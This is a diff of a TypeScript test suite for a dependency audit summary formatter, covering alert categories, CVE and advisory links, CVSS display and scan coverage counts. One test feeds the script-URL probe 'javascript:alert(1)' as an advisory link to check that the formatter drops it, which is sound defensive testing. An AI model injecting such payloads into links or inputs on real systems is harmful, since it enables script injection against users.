                   key: '1',
                   type: 'malware',
                   severity: 'critical',
-                  category: 'malware',
+                  category: 'supplyChainRisk',
                 },
               ],
             }),
@@ -893,7 +1885,7 @@ t.test('formatAuditSummary', async t => {
                   key: '2',
                   type: 'severity',
                   severity: 'high',
-                  category: 'severity',
+                  category: 'vulnerability',
                 },
               ],
               direct: true,
@@ -905,11 +1897,13 @@ t.test('formatAuditSummary', async t => {
         indirectCount: 1,
       })
       const output = formatAuditSummary(result)
-      t.match(output, /^2 packages with security issues\n/)
+      t.match(output, /^2 packages with security issues$/m)
       t.match(output, /^1 malware, 1 vulnerable$/m)
       t.match(output, /^1 critical, 1 high$/m)
       t.match(output, /critical\s+pkg-c@2\.0\.0\s+malware: critical/)
-      t.match(output, /high\s+pkg-h@1\.0\.0\s+severity: high/)
+      // the `severity` alert type is labelled "vulnerability" -- the
+      // feed's own type names aren't shown to users
+      t.match(output, /high\s+pkg-h@1\.0\.0\s+vulnerability: high/)
       t.match(output, /1 direct dependency, 1 transitive/)
       t.ok(
         output.indexOf('pkg-c@2.0.0') < output.indexOf('pkg-h@1.0.0'),
@@ -949,13 +1943,13 @@ t.test('formatAuditSummary', async t => {
                   key: '1',
                   type: 'malware',
                   severity: 'high',
-                  category: 'malware',
+                  category: 'supplyChainRisk',
                 },
                 {
                   key: '2',
                   type: 'severity',
                   severity: 'high',
-                  category: 'severity',
+                  category: 'vulnerability',
                 },
               ],
               cves: ['CVE-2021-1234'],
@@ -972,10 +1966,16 @@ t.test('formatAuditSummary', async t => {
       t.match(output, /1 high/)
       // colors: true renders CVEs as OSC 8 terminal hyperlinks
       // (ESC ]8;;URL ESC \ TEXT ESC ]8;; ESC \) instead of the plain
-      // "text (url)" fallback used when colors is false.
+      // "text (url)" fallback used when colors is false. The label is
+      // underlined, so SGR codes sit between the terminator and it.
       t.match(
         output,
-        /\x1b]8;;https:\/\/nvd\.nist\.gov\/vuln\/detail\/CVE-2021-1234\x1b\\CVE-2021-1234/,
+        /\x1b]8;;https:\/\/nvd\.nist\.gov\/vuln\/detail\/CVE-2021-1234\x1b\\(?:\x1b\[[0-9;]*m)*CVE-2021-1234/,
+      )
+      t.match(
+        output,
+        /\x1b\[4mCVE-2021-1234/,
+        'the link label is underlined',
       )
     },
   )
@@ -994,7 +1994,7 @@ t.test('formatAuditSummary', async t => {
         },
       },
     ]
-    const result = aggregateBySeverity(nodes, new Set())
+    const result = aggregate(nodes, new Set())
     t.equal(result.total, 1, 'counts vuln-only package')
     t.equal(
       result.summary.critical.length,
@@ -1002,4 +2002,160 @@ t.test('formatAuditSummary', async t => {
       'reports in critical bucket',
     )
   })
+})
+
+t.test('scanCoverage', async t => {
+  t.test('counts scanned and unscanned nodes', async t => {
+    t.strictSame(
+      scanCoverage(
+        [
+          { id: 'a', insights: { scanned: true } },
+          { id: 'b', insights: { scanned: true } },
+          { id: 'c', insights: { scanned: false } },
+        ].map(asNode),
+      ),
+      { scanned: 2, unscanned: 1 },
+    )
+  })
+
+  t.test('ignores nodes that say nothing about scanning', async t => {
+    t.strictSame(
+      scanCoverage(
+        [
+          // no insights at all
+          { id: 'a' },
+          // insights present, but no `scanned` key
+          { id: 'b', insights: {} },
+          // insights explicitly null
+          { id: 'c', insights: null },
+          { id: 'd', insights: { scanned: true } },
+        ].map(asNode),
+      ),
+      { scanned: 1, unscanned: 0 },
+      'only nodes carrying a `scanned` flag are counted either way',
+    )
+  })
+
+  t.test('skips anything that is not a graph node', async t => {
+    t.strictSame(
+      scanCoverage([
+        undefined,
+        null,
+        'nope',
+        { id: 'unbranded', insights: { scanned: true } },
+      ]),
+      { scanned: 0, unscanned: 0 },
+    )
+  })
+
+  t.test('handles an empty graph', async t => {
+    t.strictSame(scanCoverage([]), { scanned: 0, unscanned: 0 })
+  })
+})
+
+t.test('advisory links', async t => {
+  const withProps = (
+    props: Record<string, unknown>,
+    colors?: boolean,
+  ) =>
+    formatAuditSummary(
+      makeResult({
+        summary: {
+          ...emptySummary(),
+          high: [
+            makePkg({
+              name: 'p',
+              alerts: [
+                {
+                  key: '1',
+                  type: 'cve',
+                  severity: 'high',
+                  category: 'vulnerability',
+                  props: { lastPublish: '2026-01-01', ...props },
+                },
+              ],
+            }),
+          ],
+        },
+        total: 1,
+        indirectCount: 1,
+      }),
+      { colors },
+    )
+
+  t.test('labels a GHSA link with its id', async t => {
+    t.match(
+      withProps({ ghsaId: 'GHSA-aaaa-bbbb-cccc' }),
+      /GHSA-aaaa-bbbb-cccc \(https:\/\/github\.com\/advisories\/GHSA-aaaa-bbbb-cccc\)/,
+    )
+  })
+
+  t.test(
+    'labels a feed-supplied url with its host, not an id',
+    async t => {
+      const output = withProps({
+        url: 'https://advisories.example/x',
+      })
+      t.match(
+        output,
+        /advisories\.example \(https:\/\/advisories\.example\/x\)/,
+        'the reader can see where it actually goes',
+      )
+    },
+  )
+
+  t.test('drops a non-http url entirely', async t => {
+    const output = withProps({ url: 'javascript:alert(1)' })
+    t.notMatch(output, /javascript:/, 'never handed to the OS opener')
+  })
+
+  t.test('renders CWE links and the CVSS score', async t => {
+    const output = withProps({
+      cwes: [{ id: 'CWE-79' }],
+      cvss: { score: 7.5, vectorString: 'x' },
+    })
+    t.match(
+      output,
+      /CWE-79 \(https:\/\/cwe\.mitre\.org\/data\/definitions\/79\.html\)/,
+      'the numeric id is extracted for the URL',
+    )
+    t.match(output, /CVSS 7\.5/)
+  })
+
+  t.test('ignores a non-numeric CVSS score', async t => {
+    t.notMatch(
+      withProps({ cvss: { score: 'high' } }),
+      /CVSS/,
+      'a malformed score is omitted rather than printed',
+    )
+  })
+})
+
+t.test('collapses repeated identical findings', async t => {
+  const alert = (key: string) => ({
+    key,
+    type: 'networkAccess',
+    severity: 'middle' as const,
+    category: 'supplyChainRisk' as const,
+  })
+  const output = formatAuditSummary(
+    makeResult({
+      summary: {
+        ...emptySummary(),
+        medium: [
+          makePkg({
+            name: 'chatty',
+            alerts: [alert('1'), alert('2'), alert('3')],
+          }),
+        ],
+      },
+      total: 1,
+      indirectCount: 1,
+    }),
+  )
+  t.match(
+    output,
+    /network access: medium x3/,
+    'three identical findings render once with a count',
+  )
 })
